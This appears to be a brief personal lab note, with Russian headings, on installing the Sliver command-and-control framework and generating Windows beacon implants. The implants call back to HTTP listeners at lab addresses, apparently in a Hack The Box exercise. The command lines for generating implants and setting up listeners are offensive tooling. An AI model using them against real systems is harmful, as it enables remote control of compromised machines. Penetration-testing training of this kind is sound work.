# Sliver
Sliver
# Устновка v1.5.42
    wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
    chmod +x ./sliver-server_linux
    new-operator -n student -l 10.10.14.193
    multiplayer

    get -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
    mxdelta@htb[/htb]$ chmod +x ./sliver-client_linux
    mxdelta@htb[/htb]$ ./sliver-client_linux import student_10.10.14.193.cfg 

    armory install seatbelt

  # Создание маячков и сессий
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
    http -L 10.10.16.14 -l 9001
